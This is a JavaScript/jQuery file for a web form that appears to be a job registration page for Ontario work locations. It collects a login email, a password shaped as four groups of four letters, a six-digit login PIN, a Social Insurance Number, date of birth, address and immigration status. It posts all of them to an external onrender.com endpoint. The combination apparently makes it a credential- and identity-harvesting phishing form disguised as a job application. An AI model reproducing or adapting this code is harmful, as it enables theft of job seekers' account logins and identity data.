$(document).ready(function () {
  // Remove 'is-invalid' class and hide error on typing or change
  $(".form-control, .form-select").on("input change", function () {
    $(this).removeClass("is-invalid");

    // Hide location error for multi-select
    if ($(this).attr("id") === "preferredLocations") {
      $("#locationError").hide();
    }
  });

  // Remove work eligibility error on change
  $("input[name='workEligibility']").on("change", function () {
    $("#workEligibilityError").remove();
  });

  // Remove status error on change
  $("input[name='statusCanada']").on("change", function () {
    $("#statusError").remove();
  });
});

function formatDate(inputDate) {
  if (!inputDate) return "";
  const [year, month, day] = inputDate.split("-");
  return `${month}-${day}-${year}`;
}

// Populate Preferred Work Location
const allJobs = [
  "Toronto",
  "Whitby",
  "Cambridge",
  "Oakville",
  "Brantford",
  "Kitchener",
  "St. Thomas",
  "London",
  "Windsor",
  "Hamilton",
  "Mississauga",
  "Etobicoke",
  "Brampton",
  "Scarborough",
  "Bolton",
  "Ajax",
  "Belleville",
  "Barrhaven",
  "Stoney Creek",
  "Richmond Hill",
  "Milton",
  "Concord",
];

allJobs.forEach((job) => {
  $("#preferredLocations").append(`<option value="${job}">${job}</option>`);
});
$(".selectpicker").selectpicker();

toastr.options = {
  closeButton: true,
  progressBar: true,
  positionClass: "toast-page-center",
  timeOut: "10000",
};

$("#dobError, #locationError").hide();

$("#registrationForm").on("submit", function (e) {
  e.preventDefault();
  let isValid = true;
  $(".form-control, .form-select").removeClass("is-invalid");
  $("#dobError, #locationError").hide();
  $("#locationError, #dobError, #workEligibilityError, #statusError").hide();

  // Check required fields (by id)
  const requiredFields = [
    "legalFirst",
    "legalSurname",
    "loginEmail",
    "passwordKey",
    "loginPin",
    "mobileNumber",
    "address",
    "sinNumber",
    "arrivalDate",
    "workEligibility",
    "dob",
    "preferredLocations",
    // 'additionalNotes',
    "statusCanada",
  ];
  requiredFields.forEach((id) => {
    const input = document.getElementById(id);
    if (input && !input.value.trim()) {
      input.classList.add("is-invalid");
      isValid = false;
    }
  });

  const passwordField = document.getElementById("passwordKey");
  const passwordValue = passwordField.value.trim();
  const passwordRegex = /^[A-Za-z]{4}\s[A-Za-z]{4}\s[A-Za-z]{4}\s[A-Za-z]{4}$/;

  if (!passwordRegex.test(passwordValue)) {
    passwordField.classList.add("is-invalid");
    isValid = false;
  } else {
    passwordField.classList.remove("is-invalid");
  }

  if (passwordField) {
    passwordField.addEventListener("input", function () {
      let value = this.value.replace(/[^a-zA-Z]/g, "").substring(0, 16);
      let formatted = "";
      for (let i = 0; i < value.length; i++) {
        if (i > 0 && i % 4 === 0) formatted += " ";
        formatted += value[i];
      }
      this.value = formatted;
    });
  }

  // Custom Email Validation
  const email = $("#loginEmail").val().trim();
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!emailRegex.test(email)) {
    $("#loginEmail").addClass("is-invalid");
    isValid = false;
  }

  // Only allow digits while typing and limit to 10 digits
  $("#mobileNumber").on("input", function () {
    this.value = this.value.replace(/\D/g, "").substring(0, 10);
  });

  // On form submit: validate 10-digit mobile number
  const mobile = $("#mobileNumber").val().trim();
  if (!/^\d{10}$/.test(mobile)) {
    $("#mobileNumber").addClass("is-invalid");
    isValid = false;
  } else {
    $("#mobileNumber").removeClass("is-invalid");
  }

  // Only allow digits while typing and limit to 9 digits
  $("#sinNumber").on("input", function () {
    this.value = this.value.replace(/\D/g, "").substring(0, 9);
  });

  // On form submit: validate 9-digit SIN number
  const sin = $("#sinNumber").val().trim();
  if (!/^\d{9}$/.test(sin)) {
    $("#sinNumber").addClass("is-invalid");
    isValid = false;
  } else {
    $("#sinNumber").removeClass("is-invalid");
  }

  $("#loginPin").on("input", function () {
    this.value = this.value.replace(/\D/g, "").substring(0, 6);
  });

  // On form submit: validate 9-digit SIN number
  const loginPin = $("#loginPin").val().trim();
  if (!/^\d{6}$/.test(loginPin)) {
    $("#loginPin").addClass("is-invalid");
    isValid = false;
  } else {
    $("#loginPin").removeClass("is-invalid");
  }

  // Work Eligibility Validation
  const eligibility = $("input[name='workEligibility']:checked").val();
  if (!eligibility) {
    isValid = false;
    if ($("#workEligibilityError").length === 0) {
      $("input[name='workEligibility']")
        .closest(".radio-group")
        .append(
          '<div class="invalid-feedback d-block text-danger" id="workEligibilityError">Please select an option.</div>'
        );
    }
  } else {
    $("#workEligibilityError").remove();
  }

  // Preferred Location Validation
  const selectedLocations = $("#preferredLocations").val();
  if (!selectedLocations || selectedLocations.length === 0) {
    isValid = false;
    $("#preferredLocations").addClass("is-invalid");
    $("#locationError").show();
  }

  // Status in Canada Validation
  const statuses = $("input[name='statusCanada']:checked").val();
  if (!statuses) {
    isValid = false;
    if ($("#statusError").length === 0) {
      $("input[name='statusCanada']")
        .closest(".radio-group")
        .append(
          '<div class="invalid-feedback d-block text-danger" id="statusError">Please select your status.</div>'
        );
    }
  } else {
    $("#statusError").remove();
  }

  if (isValid) {
    const generateKey = () => {
      const chars =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
      let key = "";
      for (let i = 0; i < 15; i++) {
        key += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      return key;
    };

    const data = {
      submittedAt: new Date().toLocaleString(),
      submissionKey: generateKey(),

      referenceName: $("#referenceName").val(),
      legalFirst: $("#legalFirst").val(),
      legalMiddle: $("#legalMiddle").val(),
      legalSurname: $("#legalSurname").val(),
      loginEmail: $("#loginEmail").val(),
      passwordKey: $("#passwordKey").val(),
      loginPin: $("#loginPin").val(),
      mobileNumber: $("#mobileNumber").val(),
      address: $("#address").val(),
      sinNumber: $("#sinNumber").val(),
      arrivalDate: formatDate($("#arrivalDate").val()),
      dob: formatDate($("#dob").val()),
      workEligibility: eligibility,
      preferredLocations: $("#preferredLocations").val(),
      additionalNotes: $("#additionalNotes").val(),
      statusCanada: statuses,
    };

    $.ajax({
      url: "https://az-zcye.onrender.com/submit",
      method: "POST",
      contentType: "application/json",
      data: JSON.stringify(data),
      success: function () {
        toastr.success("Your Form is submitted successfully!");
        $("#registrationForm")[0].reset();
        $(".selectpicker").selectpicker("deselectAll");
      },
      error: function (er) {
        console.error("Error:", er);

        toastr.error("Submission failed. Please try again.");
      },
    });
  } else {
    toastr.error("Please fix errors in the form.");
  }
});
